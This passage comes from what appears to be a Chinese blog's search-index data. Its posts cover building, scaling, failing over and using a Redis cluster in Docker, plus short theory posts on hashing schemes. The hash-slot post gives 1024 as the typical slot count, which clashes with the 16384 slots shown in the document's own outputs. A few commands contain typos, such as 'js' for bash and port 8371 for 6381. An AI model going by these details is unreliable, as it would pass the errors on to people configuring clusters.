折叠代码\nS: f999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381\n   slots: (0 slots) slave\n   replicates 849a82f0bd85238762ca7ccf234aa30ba97d93a0\nM: 849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386\n   slots:[1365-5460] (4096 slots) master\n   1 additional replica(s)\nS: 9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385\n   slots: (0 slots) slave\n   replicates 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40\nS: 8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384\n   slots: (0 slots) slave\n   replicates 6dca84998e245ce4cc6c92882fb7ac94d501efda\nM: 6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382\n   slots:[6827-10922] (4096 slots) master\n   1 additional replica(s)\nS: 8758dde1064a8fd6aacbc15dfd90d3ca4545cc73 192.168.1.42:6388\n   slots: (0 slots) slave\n   replicates 791172307abf9223425af595e661cec441951170\nM: 791172307abf9223425af595e661cec441951170 192.168.1.42:6387\n   slots:[0-1364],[5461-6826],[10923-12287] (4096 slots) master\n   1 additional replica(s)\nM: 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383\n   slots:[12288-16383] (4096 slots) master\n   1 additional replica(s)\n```\n\n2. 移除6388Slave主机\n\n```bash\nredis-cli --cluster del-node 192.168.1.42:6388 8758dde1064a8fd6aacbc15dfd90d3ca4545cc73\n```\n\n效果：\n\n```bash\nroot@knight:/data# redis-cli --cluster del-node 192.168.1.42:6388 8758dde1064a8fd6aacbc15dfd90d3ca4545cc73\n>>> Removing node 8758dde1064a8fd6aacbc15dfd90d3ca4545cc73 from cluster 192.168.1.42:6388\n>>> Sending CLUSTER FORGET messages to the cluster...\n>>> Sending CLUSTER RESET SOFT to the deleted node.\n```\n\n3. 再次查看集群的状态信息\n\n```bash\nredis-cli --cluster check 192.168.1.42:6381\n```\n\n效果：\n\n```bash 折叠代码\nS: f999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381\n   slots: (0 slots) slave\n   replicates 849a82f0bd85238762ca7ccf234aa30ba97d93a0\nM: 849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386\n   slots:[1365-5460] (4096 slots) master\n   1 additional replica(s)\nS: 9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385\n   slots: (0 slots) slave\n   replicates 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40\nS: 8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384\n   slots: (0 slots) slave\n   replicates 6dca84998e245ce4cc6c92882fb7ac94d501efda\nM: 6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382\n   slots:[6827-10922] (4096 slots) master\n   1 additional replica(s)\nM: 791172307abf9223425af595e661cec441951170 192.168.1.42:6387\n   slots:[0-1364],[5461-6826],[10923-12287] (4096 slots) master\nM: 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383\n   slots:[12288-16383] (4096 slots) master\n   1 additional replica(s)\n```\n\n可以看到只有3个Slave主机了。\n\n4. 重新分配槽号\n\n```bash\nredis-cli --cluster reshard 192.168.1.42:6381\n```\n\n要删除的是6387的Master主机，要把6387拥有的槽号统一分配给6386的Master主机，按照下图的指示进行操作：\n\n![重新分配槽号](./RedisDel/1.png)\n\n5. 稍作等待，待槽号重新分配完成，查看集群节点的槽号信息\n\n```bash\nredis-cli --cluster check 192.168.1.42:6381\n```\n\n效果：\n\n```bash\nroot@knight:/data# redis-cli --cluster check 192.168.1.42:6381\n192.168.1.42:6386 (849a82f0...) -> 0 keys | 8192 slots | 1 slaves.\n192.168.1.42:6382 (6dca8499...) -> 1 keys | 4096 slots | 1 slaves.\n192.168.1.42:6387 (79117230...) -> 0 keys | 0 slots | 0 slaves.\n192.168.1.42:6383 (41f99f51...) -> 1 keys | 4096 slots | 1 slaves.\n```\n\n可以看到6387的主机已经没有任何槽号了，而6386主机比其他两个Master节点多出来4096个槽号。\n\n5. 从集群删除6387节点\n\n```bash\nredis-cli --cluster del-node 192.168.1.42:6387 791172307abf9223425af595e661cec441951170\n```\n\n效果：\n\n```bash\nroot@knight:/data# redis-cli --cluster del-node 192.168.1.42:6387 791172307abf9223425af595e661cec441951170\n>>> Removing node 791172307abf9223425af595e661cec441951170 from cluster 192.168.1.42:6387\n>>> Sending CLUSTER FORGET messages to the cluster...\n>>> Sending CLUSTER RESET SOFT to the deleted node.\n```\n\n6. 再次查看集群节点信息\n\n```bash\nredis-cli --cluster check 192.168.1.42:6381\n```\n\n效果：\n\n```bash 折叠代码\nS: f999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381\n   slots: (0 slots) slave\n   replicates 849a82f0bd85238762ca7ccf234aa30ba97d93a0\nM: 849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386\n   slots:[0-6826],[10923-12287] (8192 slots) master\n   1 additional replica(s)\nS: 9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385\n   slots: (0 slots) slave\n   replicates 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40\nS: 8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384\n   slots: (0 slots) slave\n   replicates 6dca84998e245ce4cc6c92882fb7ac94d501efda\nM: 6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382\n   slots:[6827-10922] (4096 slots) master\n   1 additional replica(s)\nM: 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383\n   slots:[12288-16383] (4096 slots) master\n   1 additional replica(s)\n```\n\n可以看到集群又恢复到3主3从的节点状态。","tags":["Docker","Redis"],"categories":["技术"]},{"title":"Redis扩容案例","url":"/2023/08/14/RedisAdd/","content":"\n### 操作步骤\n\n1. 新建两个容器\n\n```bash\ndocker run -d --name redis-node-7 --net host --privileged=true -v /docker/redis/share/redis-node-7:/data redis:6.0.8 --cluster-enabled yes --appendonly yes --port 6387\ndocker run -d --name redis-node-8 --net host --privileged=true -v /docker/redis/share/redis-node-8:/data redis:6.0.8 --cluster-enabled yes --appendonly yes --port 6388\n```\n\n<!-- more -->\n\n2. 进入7号容器（新建的容器）\n\n```bash\ndocker exec -it redis-node-7 bash\n```\n\n3. 使7号容器加入集群\n\n```bash\nredis-cli --cluster add-node 192.168.1.42:6387 192.168.1.42:6381\n```\n\n前面写的是本容器的IP:端口，后面跟着是集群领路人的IP:端口。执行后出现如下的提示信息表示成功：\n\n```bash\n>>> Check for open slots...\n>>> Check slots coverage...\n[OK] All 16384 slots covered.\n>>> Send CLUSTER MEET to node 192.168.1.42:6387 to make it join the cluster.\n[OK] New node added correctly.\n```\n\n4. 查看集群的节点信息\n\n```bash\nredis-cli --cluster check 192.168.1.42:8371\n```\n\n效果：\n\n```bash 折叠代码\n192.168.1.42:6386 (849a82f0...) -> 0 keys | 5461 slots | 1 slaves.\n192.168.1.42:6382 (6dca8499...) -> 1 keys | 5462 slots | 1 slaves.\n192.168.1.42:6387 (79117230...) -> 0 keys | 0 slots | 0 slaves.\n192.168.1.42:6383 (41f99f51...) -> 1 keys | 5461 slots | 1 slaves.\n\nS: f999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381\n   slots: (0 slots) slave\n   replicates 849a82f0bd85238762ca7ccf234aa30ba97d93a0\nM: 849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386\n   slots:[0-5460] (5461 slots) master\n   1 additional replica(s)\nS: 9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385\n   slots: (0 slots) slave\n   replicates 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40\nS: 8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384\n   slots: (0 slots) slave\n   replicates 6dca84998e245ce4cc6c92882fb7ac94d501efda\nM: 6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382\n   slots:[5461-10922] (5462 slots) master\n   1 additional replica(s)\nM: 791172307abf9223425af595e661cec441951170 192.168.1.42:6387\n   slots: (0 slots) master\nM: 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383\n   slots:[10923-16383] (5461 slots) master\n   1 additional replica(s)\n```\n\n从以上的效果可以看到，端口被6387的节点已经成功添加进来，但是并没有像其他的Master主机一样分配到槽位。所以从实际意义上来说，它还不算正式加入集群。\n\n5. 重新分配槽号\n\n```bash\nredis-cli --cluster reshard 192.168.1.42:6381\n```\n\n后面接着的IP还是集群的领路人。\n\n执行后，要求我们输入每台分配多少个槽号，简单计算一下，一共16384个槽号，4台机器分，每台4096个槽号。\n\n然后下面输入新加入的机器的节点ID。\n\n输入all，最后输入yes确认。\n\n```bash\nHow many slots do you want to move (from 1 to 16384)? 4096\nWhat is the receiving node ID? 791172307abf9223425af595e661cec441951170\nPlease enter all the source node IDs.\n  Type 'all' to use all the nodes as source nodes for the hash slots.\n  Type 'done' once you entered all the source nodes IDs.\nSource node #1: all\n```\n\n6. 再次查看集群节点信息\n\n```bash\nredis-cli --cluster check 192.168.1.42:6381\n```\n\n```bash 折叠代码\n192.168.1.42:6386 (849a82f0...) -> 0 keys | 4096 slots | 1 slaves.\n192.168.1.42:6382 (6dca8499...) -> 1 keys | 4096 slots | 1 slaves.\n192.168.1.42:6387 (79117230...) -> 0 keys | 4096 slots | 0 slaves.\n192.168.1.42:6383 (41f99f51...) -> 1 keys | 4096 slots | 1 slaves.\n\nS: f999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381\n   slots: (0 slots) slave\n   replicates 849a82f0bd85238762ca7ccf234aa30ba97d93a0\nM: 849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386\n   slots:[1365-5460] (4096 slots) master\n   1 additional replica(s)\nS: 9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385\n   slots: (0 slots) slave\n   replicates 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40\nS: 8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384\n   slots: (0 slots) slave\n   replicates 6dca84998e245ce4cc6c92882fb7ac94d501efda\nM: 6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382\n   slots:[6827-10922] (4096 slots) master\n   1 additional replica(s)\nM: 791172307abf9223425af595e661cec441951170 192.168.1.42:6387\n   slots:[0-1364],[5461-6826],[10923-12287] (4096 slots) master\nM: 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383\n   slots:[12288-16383] (4096 slots) master\n   1 additional replica(s)\n```\n\n从概略信息可以看到4台机器都分配到了槽号，从下面的详细槽号信息，我们可以观察出，新加入的6387机器分配到的槽号是由其他3台主机各匀过来的。\n\n7. 为新加入的Master主机添加Slave主机\n\n```bash\nredis-cli --cluster add-node 192.168.1.42:6388 192.168.1.42:6387 --cluster-slave --cluster-master-id 791172307abf9223425af595e661cec441951170\n```\n\n* 192.168.1.42:6388 Slave主机的IP:端口\n\n* 192.168.1.42:6387 Master主机的IP:端口\n\n* 最后加要挂载的Master主机的节点ID\n\n8. 查看节点信息\n\n```bash 折叠代码\nroot@knight:/data# redis-cli -p 6381\n127.0.0.1:6381> cluster nodes\n849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386@16386 master - 0 1692019970307 7 connected 1365-5460\nf999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381@16381 myself,slave 849a82f0bd85238762ca7ccf234aa30ba97d93a0 0 1692019967000 7 connected\n9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385@16385 slave 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 0 1692019968297 3 connected\n8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384@16384 slave 6dca84998e245ce4cc6c92882fb7ac94d501efda 0 1692019965000 2 connected\n6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382@16382 master - 0 1692019968000 2 connected 6827-10922\n8758dde1064a8fd6aacbc15dfd90d3ca4545cc73 192.168.1.42:6388@16388 slave 791172307abf9223425af595e661cec441951170 0 1692019967000 8 connected\n791172307abf9223425af595e661cec441951170 192.168.1.42:6387@16387 master - 0 1692019967293 8 connected 0-1364 5461-6826 10923-12287\n41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383@16383 master - 0 1692019970000 3 connected 12288-16383\n127.0.0.1:6381> \n```","tags":["Docker","Redis"],"categories":["技术"]},{"title":"Docker演示Redis集群主从切换案例","url":"/2023/08/14/RedisMasterSlave/","content":"\n### 操作步骤\n\n1. 查看当前的集群情况\n\n```bash\nroot@knight:/data# redis-cli -p 6381 -c\n127.0.0.1:6381> cluster nodes\n41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383@16383 master - 0 1691996146001 3 connected 10923-16383\n849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386@16386 slave f999e35136ec2e61fcceebf182f5c38ef4a4354d 0 1691996144999 1 connected\n9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385@16385 slave 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 0 1691996144000 3 connected\nf999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381@16381 myself,master - 0 1691996145000 1 connected 0-5460\n8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384@16384 slave 6dca84998e245ce4cc6c92882fb7ac94d501efda 0 1691996144000 2 connected\n6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382@16382 master - 0 1691996144000 2 connected 5461-10922\n127.0.0.1:6381> \n```\n\n<!-- more -->\n\n当前登录主机为1号机，6号机是1号机的从服务器，5号机是3号机的从服务器，4号机是2号机的从服务器。\n\n2. 关闭1号机容器，然后再次查看容器的状态\n\n关闭1号容器\n\n```bash\ndocker stop redis-node-1\n```\n\n效果：\n\n```bash 折叠代码\nroot@knight:/docker# docker stop redis-node-1\nredis-node-1\nroot@knight:/docker# docker ps -a\nCONTAINER ID   IMAGE         COMMAND                  CREATED        STATUS                     PORTS     NAMES\n61d59245db3d   redis:6.0.8   \"docker-entrypoint.s…\"   28 hours ago   Up 5 hours                           redis-node-6\n223fad42e069   redis:6.0.8   \"docker-entrypoint.s…\"   28 hours ago   Up 5 hours                           redis-node-5\nf0055941fe3f   redis:6.0.8   \"docker-entrypoint.s…\"   28 hours ago   Up 5 hours                           redis-node-4\ne361d9695a0c   redis:6.0.8   \"docker-entrypoint.s…\"   28 hours ago   Up 5 hours                           redis-node-3\n400119c3015c   redis:6.0.8   \"docker-entrypoint.s…\"   28 hours ago   Up 5 hours                           redis-node-2\n61e2e38927c4   redis:6.0.8   \"docker-entrypoint.s…\"   28 hours ago   Exited (0) 9 seconds ago             redis-node-1\n```\n\n可以看到1号容器已经被关掉了。\n\n3. 然后以2号机作为切入点，查看集群的状态。\n\n进入2号容器：\n\n```bash\ndocker exec -it redis-node-2 bash\n```\n\n效果：\n\n```bash\nroot@knight:/docker# docker exec -it redis-node-2 bash\nroot@knight:/data# redis-cli -p 6382 -c\n127.0.0.1:6382> cluster nodes\n8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384@16384 slave 6dca84998e245ce4cc6c92882fb7ac94d501efda 0 1692013667508 2 connected\n6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382@16382 myself,master - 0 1692013666000 2 connected 5461-10922\n41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383@16383 master - 0 1692013667000 3 connected 10923-16383\nf999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381@16381 master,fail - 1692013443386 1692013440000 1 disconnected\n9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385@16385 slave 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 0 1692013665000 3 connected\n849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386@16386 master - 0 1692013665498 7 connected 0-5460\n127.0.0.1:6382> \n```\n\n可以看到当前6号机处于master状态，顶替了原来1号机的位置，而1号机现在处于fail状态。\n\n这就完成了redis主从切换的演示，补充一句，如果把1号机重新启动回来的话，也不会影响现在6号机的master状态，1号机会作为6号机的slave机器。\n\n效果如下：\n\n```bash 折叠代码\nroot@knight:/docker# docker start redis-node-1 \nredis-node-1\nroot@knight:/docker# docker exec -it redis-node-1 bash\nroot@knight:/data# redis-cli -p 6381 -c\n127.0.0.1:6381> cluster nodes\n849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386@16386 master - 0 1692013947000 7 connected 0-5460\nf999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381@16381 myself,slave 849a82f0bd85238762ca7ccf234aa30ba97d93a0 0 1692013947000 7 connected\n9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385@16385 slave 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 0 1692013946019 3 connected\n8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384@16384 slave 6dca84998e245ce4cc6c92882fb7ac94d501efda 0 1692013949036 2 connected\n6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382@16382 master - 0 1692013947022 2 connected 5461-10922\n41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383@16383 master - 0 1692013948030 3 connected 10923-16383\n127.0.0.1:6381> \n```","tags":["Docker","Redis"],"categories":["技术"]},{"title":"Redis集群数据读写演示","url":"/2023/08/13/RedisDataIO/","content":"\n### 数据读写存储\n\n错误演示：\n\n```bash 折叠代码\nroot@knight:/data# redis-cli -p 6381\n127.0.0.1:6381> keys *\n(empty array)\n127.0.0.1:6381> set k1 v1\n(error) MOVED 12706 192.168.1.42:6383\n127.0.0.1:6381> set k2 v2\nOK\n127.0.0.1:6381> set k3 v3\nOK\n127.0.0.1:6381> set k4 v4\n(error) MOVED 8455 192.168.1.42:6382\n127.0.0.1:6381> \n```\n\n<!-- more -->\n\n可以发现使用`redis-cli -p 6381`命令进入单节点的容器，存在部分数据无法存储的情况（k2,k3存储成功，k1,k4存储失败），正确的进入方式应该是进入集群，然后进行数据的存储。\n\n正确演示：\n\n```bash 折叠代码\n127.0.0.1:6381> exit\nroot@knight:/data# redis-cli -p 6381 -c\n127.0.0.1:6381> FLUSHALL\nOK\n127.0.0.1:6381> set k1 v1\n-> Redirected to slot [12706] located at 192.168.1.42:6383\nOK\n192.168.1.42:6383> set k4 v4\n-> Redirected to slot [8455] located at 192.168.1.42:6382\nOK\n192.168.1.42:6382> \n```\n\n退出后重新进入，清空所有的数据，重新插入之前插入失败的数据，可以插入了，并且可以发现之所以可以成功插入数据，是因为系统将数据重定向到了应该插入的机器上（注意端口号的变化）。\n\n","tags":["Docker","Redis"],"categories":["技术"]},{"title":"搭建Redis集群","url":"/2023/08/13/BuildRedis/","content":"\n### 操作步骤\n\n1. 下载镜像\n\n```bash\ndocker pull redis:6.0.8\n```\n\n<!-- more -->\n\n2. 生成容器\n\n```bash\ndocker run -d --name redis-node-1 --net host --privileged=true -v /docker/redis/share/redis-node-1:/data redis:6.0.8 --cluster-enabled yes --appendonly yes --port 6381\ndocker run -d --name redis-node-2 --net host --privileged=true -v /docker/redis/share/redis-node-2:/data redis:6.0.8 --cluster-enabled yes --appendonly yes --port 6382\ndocker run -d --name redis-node-3 --net host --privileged=true -v /docker/redis/share/redis-node-3:/data redis:6.0.8 --cluster-enabled yes --appendonly yes --port 6383\ndocker run -d --name redis-node-4 --net host --privileged=true -v /docker/redis/share/redis-node-4:/data redis:6.0.8 --cluster-enabled yes --appendonly yes --port 6384\ndocker run -d --name redis-node-5 --net host --privileged=true -v /docker/redis/share/redis-node-5:/data redis:6.0.8 --cluster-enabled yes --appendonly yes --port 6385\ndocker run -d --name redis-node-6 --net host --privileged=true -v /docker/redis/share/redis-node-6:/data redis:6.0.8 --cluster-enabled yes --appendonly yes --port 6386\n```\n\n效果展示：\n\n```bash\nroot@knight:/docker# docker ps\nCONTAINER ID   IMAGE         COMMAND                  CREATED              STATUS              PORTS     NAMES\n61d59245db3d   redis:6.0.8   \"docker-entrypoint.s…\"   About a minute ago   Up About a minute             redis-node-6\n223fad42e069   redis:6.0.8   \"docker-entrypoint.s…\"   About a minute ago   Up About a minute             redis-node-5\nf0055941fe3f   redis:6.0.8   \"docker-entrypoint.s…\"   About a minute ago   Up About a minute             redis-node-4\ne361d9695a0c   redis:6.0.8   \"docker-entrypoint.s…\"   About a minute ago   Up About a minute             redis-node-3\n400119c3015c   redis:6.0.8   \"docker-entrypoint.s…\"   About a minute ago   Up About a minute             redis-node-2\n61e2e38927c4   redis:6.0.8   \"docker-entrypoint.s…\"   4 minutes ago        Up 4 minutes                  redis-node-1\n```\n\n3. 构建主从关系\n\n随便进入一台容器，在这里使用1号机进行演示。\n\n* 进入容器\n\n```bash\ndocker exec -it redis-node-1 js 折叠代码\n```\n\n* 建立集群\n\n```bash\nredis-cli --cluster create 192.168.1.42:6381 192.168.1.42:6382 192.168.1.42:6383 192.168.1.42:6384 192.168.1.42:6385 192.168.1.42:6386 --cluster-replicas 1\n```\n\n--cluster-replicas 1 一个主服务器配置一个从服务器。\n\n之后出现下面这行提示，按要求输入`yes`\n\n```bash\nCan I set the above configuration? (type 'yes' to accept): yes\n```\n\n出现下面的提示代表集群建立完成：\n\n```bash\n[OK] All nodes agree about slots configuration.\n>>> Check for open slots...\n>>> Check slots coverage...\n[OK] All 16384 slots covered.\n```\n\n4. 查看集群信息\n\n```bash\nredis-cli -p 6381\ncluster info\ncluster nodes\n```\n\n效果展示：\n\n```bash 折叠代码\nroot@knight:/data# redis-cli -p 6381\n127.0.0.1:6381> cluster info\ncluster_state:ok\ncluster_slots_assigned:16384\ncluster_slots_ok:16384\ncluster_slots_pfail:0\ncluster_slots_fail:0\ncluster_known_nodes:6\ncluster_size:3\ncluster_current_epoch:6\ncluster_my_epoch:1\ncluster_stats_messages_ping_sent:335\ncluster_stats_messages_pong_sent:315\ncluster_stats_messages_sent:650\ncluster_stats_messages_ping_received:310\ncluster_stats_messages_pong_received:335\ncluster_stats_messages_meet_received:5\ncluster_stats_messages_received:650\n\n127.0.0.1:6381> cluster nodes\n41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383@16383 master - 0 1691914813226 3 connected 10923-16383\n849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386@16386 slave f999e35136ec2e61fcceebf182f5c38ef4a4354d 0 1691914812223 1 connected\n6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382@16382 master - 0 1691914811000 2 connected 5461-10922\n8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384@16384 slave 6dca84998e245ce4cc6c92882fb7ac94d501efda 0 1691914812000 2 connected\n9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385@16385 slave 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 0 1691914812000 3 connected\nf999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381@16381 myself,master - 0 1691914809000 1 connected 0-5460\n127.0.0.1:6381> \n```\n\n```bash\nredis-cli --cluster check 192.168.1.42:6381\n```\n\n换成自己主机的IP，端口号随便是集群的任何一个容器的都可以。\n\n效果展示：\n\n```bash 折叠代码\nroot@knight:/data# redis-cli --cluster check 192.168.1.42:6381\n192.168.1.42:6381 (f999e351...) -> 0 keys | 5461 slots | 1 slaves.\n192.168.1.42:6383 (41f99f51...) -> 1 keys | 5461 slots | 1 slaves.\n192.168.1.42:6382 (6dca8499...) -> 1 keys | 5462 slots | 1 slaves.\n[OK] 2 keys in 3 masters.\n0.00 keys per slot on average.\n>>> Performing Cluster Check (using node 192.168.1.42:6381)\nM: f999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381\n   slots:[0-5460] (5461 slots) master\n   1 additional replica(s)\nM: 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383\n   slots:[10923-16383] (5461 slots) master\n   1 additional replica(s)\nS: 849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386\n   slots: (0 slots) slave\n   replicates f999e35136ec2e61fcceebf182f5c38ef4a4354d\nS: 9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385\n   slots: (0 slots) slave\n   replicates 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40\nS: 8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384\n   slots: (0 slots) slave\n   replicates 6dca84998e245ce4cc6c92882fb7ac94d501efda\nM: 6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382\n   slots:[5461-10922] (5462 slots) master\n   1 additional replica(s)\n[OK] All nodes agree about slots configuration.\n>>> Check for open slots...\n>>> Check slots coverage...\n[OK] All 16384 slots covered.\nroot@knight:/data# \n```","tags":["Docker","Redis"],"categories":["技术"]},{"title":"分布式存储之哈希槽算法","url":"/2023/08/13/HasSlot/","content":"\n### 基本思想\n\n哈希槽(Hash Slot)算法是Redis集群实现分布式存储的核心算法。其基本思路是:\n\n1. 将整个键空间(0-2^16-1)划分为固定数目(比如1024)的槽(slot)。 \n\n2. 根据键值的哈希值对槽数取模,计算该键应该映射到哪个槽。\n\n<!-- more -->\n\n3. 将槽均匀分配给不同的节点。\n\n4. 节点只负责处理映射到自己槽位上的键值操作。\n\n例如,节点A负责0-511槽,节点B负责512-1023槽。\n\n对键值foo计算哈希值,如果余数为100,则该键值属于第100个槽,由节点A处理。\n\n这种方式可将大量键值均匀地分布在不同节点上,实现扩展。\n\n增加节点时,可以平移部分槽到新节点,不需要重定向键值,方便扩容。\n\n相比一致性哈希,哈希槽算法实现更简单,数据分布更均匀,是Redis集群首选的分布式存储算法。\n\n### 缺点\n\n哈希槽算法虽是目前最好的解决方案，但是也并不是最完美的，主要存在一下几个缺点：\n\n1. 键空间分片粒度大\n\n哈希槽算法将整个键空间划分为固定数目的槽,典型的槽位数是1024个。这导致单个槽所能存储的键值上限很大,分片粒度较粗。\n\n2. 热点键问题\n\n由于哈希冲突,可能有大量访问热点的键值都映射到同一个槽,导致访问压力集中在单个节点。\n\n3. 不均衡\n\n随着时间推移,不同槽所存储的键值数量可能出现不平衡,导致不同节点负载不均。\n\n4. 节点扩容缩容代价大\n\n扩容时需要平移部分槽到新节点;缩容时需要复制槽内数据到其他节点。数据量大时代价高。\n\n5. 只适合键值型数据库\n\n哈希槽算法依赖键值哈希映射,不适合用于关系型数据库等其他数据类型。\n\n总体来说,这些缺点限制了哈希槽算法在更大规模和更复杂场景下的适用性。需要与其他技术相结合来获取更好的分布式效果。","tags":["Docker","Redis"],"categories":["理论知识"]},{"title":"分布式存储之一致性哈希算法","url":"/2023/08/13/ConsistencyHashing/","content":"\n### 基本思想\n\n一致性哈希算法(Consistency Hashing)是一种分布式存储算法,通过哈希环实现数据的均衡分布和高可用。主要特点是:\n\n1. 数据映射到一个0到2^32的哈希环上。\n\n2. 节点也映射到这个哈希环上。\n\n<!-- more -->\n\n3. 每个数据通过哈希函数确定一个位置,定位到其顺时针方向第一台服务器节点上。\n\n4. 当新增或删除节点时,只影响相邻数据,大部分数据位置不变。\n\n比如节点A映射到哈希环的30位置,节点B映射到70位置。数据X映射到40位置,按顺时针方向找到节点A,所以存储到A上。\n\n如果新增节点C映射到50位置,只会影响40-50区间数据,其它数据位置不变,实现了高可用。\n\n相比哈希取余,一致性哈希算法只需要重定位部分数据,大大减少了扩容缩容的影响。\n\n它的缺点是数据分布不够均匀,容易造成数据倾斜。常见优化是引入虚拟节点来纾解热点问题。\n\n拓展资料：[简单介绍：一致性HASH算法和取余算法](https://blog.51cto.com/u_12740336/6173086)","tags":["Docker","Redis"],"categories":["理论知识"]},{"title":"分布式存储之哈希取余算法","url":"/2023/08/13/HashRemainder/","content":"\n### 基本思想\n\n哈希取余算法是一种简单的分布式存储算法,基本思想是:\n\n1. 对存储数据计算哈希值(hash)\n\n2. 对存储节点数量取余,得到一个索引值\n\n<!-- more -->\n\n3. 根据索引值将数据存储到对应的存储节点上\n\n例如,有存储数据A,B,C,总共3个存储节点(节点号0,1,2)\n\n1. 计算A的哈希值hash(A) = 7 \n\n2. 7 % 3 = 1,所以存储到节点1\n\n3. 计算B的哈希值hash(B) = 11\n\n4. 11 % 3 = 2,所以存储到节点2\n\n5. 计算C的哈希值hash(C) = 5\n\n6. 5 % 3 = 2,所以也存储到节点2\n\n通过这个算法,可以将数据均匀地分布到不同的存储节点上,实现负载均衡。\n\n这种算法的优点是简单易实现,计算速度快,缺点是扩容或节点变更时需要重定位大量数据,也无法防止数据热点问题。\n\n所以哈希取余算法适用于小规模、低变更频率的分布式存储场景。在大数据量或高变更频率场景下,会采用一致性哈希等更高效的算法。","tags":["Docker","Redis"],"categories":["理论知识"]},{"title":"Docker实现MySQL主从复制","url":"/2023/08/12/DockerMySQLMasterSlave/","content":"\n### 操作步骤\n\n1. 下载镜像\n\n```bash\ndocker pull mysql:5.7\n```\n\n目前我测试最新的8.0.27是不能测试成功的，不知道原因出在哪里，保守一点使用5.7的版本。\n\n<!-- more -->\n\n实现效果：\n\n```bash\nroot@knight:/docker# docker images\nREPOSITORY   TAG       IMAGE ID       CREATED         SIZE\nmysql        latest    3218b38490ce   19 months ago   516MB\n```\n\n2. 